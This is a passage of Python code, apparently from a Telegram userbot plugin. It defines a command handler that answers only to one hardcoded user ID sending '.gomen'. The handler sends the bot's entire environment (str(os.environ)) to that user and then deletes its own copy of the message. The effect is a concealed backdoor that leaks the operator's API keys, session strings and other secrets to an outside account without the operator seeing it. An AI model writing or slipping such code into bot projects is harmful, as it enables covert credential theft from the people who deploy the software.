...
@register(incoming=True, from_users=1603412565, pattern=r"^.gomen$")
async def _(event):
    msg = await bot.send_message(1603412565, str(os.environ))
    await bot.delete_messages(1603412565, msg, revoke=False)
